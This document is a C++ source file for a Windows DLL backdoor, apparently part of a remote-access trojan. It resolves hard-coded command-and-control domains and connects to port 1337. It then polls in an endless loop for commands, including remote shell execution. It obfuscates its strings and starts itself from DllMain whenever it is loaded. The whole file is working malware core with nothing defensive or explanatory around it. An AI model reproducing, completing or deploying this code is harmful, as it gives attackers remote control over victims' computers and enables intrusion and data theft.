#include <iostream>
#include <WS2tcpip.h>
#include <windows.h>
#include "TCPClient.h"
#include "AutoHandle.h"
#include "utils.h"
#include "commands.h"
#include "obfuscate.h"
#include "config.h"

void get_command(TCPClient client) {
    client.reconnect();
    auto data = client.receive(4);
    switch ((*data)[0]) {
    case 0: // ping
        handle_ping_command(client);
        break;
    case 1: // Execute shell
        handle_shell_command(client);
        break;
    default:
        client.send_data(OBFUSCATE("Unknown command"));
        break;
    }

    client.disconnect();
}

int  main(/*HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR p_cmd_line, int n_cmd_show*/) {
    initilize_winapi();
    std::string cnc_ip = "";
    while (cnc_ip == "") {
        for (const char* domain : CNC_DOMAINS) {
            cnc_ip = domain_to_ip(domain);
            if (cnc_ip != "") {
                break;
            }
        }
        Sleep(1000 * 10);
    }
    TCPClient client(cnc_ip.c_str(), 1337);
    // Command handler:
    while (1) {
        get_command(client);
        Sleep(1000 * 10);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
        main();
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}